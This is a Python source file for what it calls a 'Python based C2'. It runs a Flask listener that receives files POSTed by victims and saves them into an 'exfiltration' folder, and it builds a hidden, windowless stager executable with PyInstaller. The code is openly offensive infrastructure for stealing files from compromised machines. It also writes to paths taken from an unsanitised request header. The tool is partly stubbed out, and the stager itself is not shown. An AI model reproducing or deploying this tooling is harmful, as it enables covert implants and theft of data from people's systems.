import subprocess
import  os
import shutil
import pdb
import argparse
from flask import Flask,request


def run_flask():
    app = Flask('app')

    @app.route('/',methods = ['GET', 'POST'])
    def run():
        if request.method == 'GET':
            return 'GET ME THOSE FILES I ASKED'
        if request.method == 'POST':
            # data = request.json
            # import pdb
            # pdb.set_trace()
            if not os.path.exists('./exfiltration'):
                os.mkdir('./exfiltration')
            ## wb enables to write bianry
            with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
                # Write bytes to file
                f.write(request.data)
            f.close()
            return "OK"

    
    app.run(host = '0.0.0.0', port = 8080)

def generate_stager():
    ## Convert to exe and save
    if os.path.exists('./tmp'):
        shutil.rmtree('./tmp')

    os.mkdir('./tmp')
    subprocess.call(r"python -m PyInstaller --noconsole --onefile --name stager ../stager.py", cwd=r"./tmp")


def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args

def main():
    args = parser()
    if args.generate:
        ## Import stager code and convert to exe
        generate_stager()
    
    while True:
        cmd = str(input())
        if cmd == 'http':
            ## Run a http listsener
            run_flask()
        if cmd == 'getfiles':
            pass
        if cmd == 'exit':
            break
    

    

if __name__=="__main__":
    main()